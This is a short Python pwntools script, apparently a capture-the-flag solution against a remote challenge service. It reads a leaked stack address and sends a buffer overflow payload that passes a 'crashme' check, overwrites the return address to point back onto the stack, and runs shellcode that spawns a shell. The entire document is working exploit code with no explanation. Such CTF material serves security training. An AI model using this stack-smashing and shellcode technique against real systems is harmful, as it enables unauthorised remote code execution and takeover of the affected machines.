from pwn import *
from LibcSearcher import *

context.os = 'linux'
context.arch = 'i386'
# context.log_level = "debug"

io = remote('node4.buuoj.cn', 28054)
io.recvuntil(b'crash: ')

s_addr = int(io.recvuntil(b'\n', drop=True), 16)
io.success("s addr: ", hex(s_addr))

payload = b'crashme\x00'.ljust(0x32-0x1c, b'a')+p32(0xdeadbeef)+p32(s_addr-0x1c)+asm(shellcraft.sh())
io.sendline(payload)

io.interactive()